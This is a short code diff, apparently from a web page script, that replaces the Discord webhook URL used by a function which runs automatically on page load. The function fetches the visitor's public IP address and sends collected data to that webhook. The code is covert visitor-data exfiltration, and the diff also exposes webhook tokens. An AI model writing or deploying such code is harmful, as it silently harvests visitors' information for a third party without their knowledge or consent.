@@ -25,7 +25,7 @@ function sendToWebhook(webhookUrl, data) {
 }
 
 async function collectAndSend() {
-  const webhookUrl = 'https://discord.com/api/webhooks/1305775707019935787/29_mxdVcutrhmUed8uuqry1-IKZyXodX8puHIjiDy0Ae61qxf_aAFABHziiNX0x8-X79';
+  const webhookUrl = 'https://discord.com/api/webhooks/1395181313798967368/HSwiokDDopSK6vteiEOq_c2SuCPTsln9UewDS9IYMXnK68pMNuEzXghcfg3VArDCT19L';
   
   try {
     const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -64,3 +64,4 @@ async function collectAndSend() {
 
 // Start collection when document is ready
 document.addEventListener('DOMContentLoaded', collectAndSend);
+
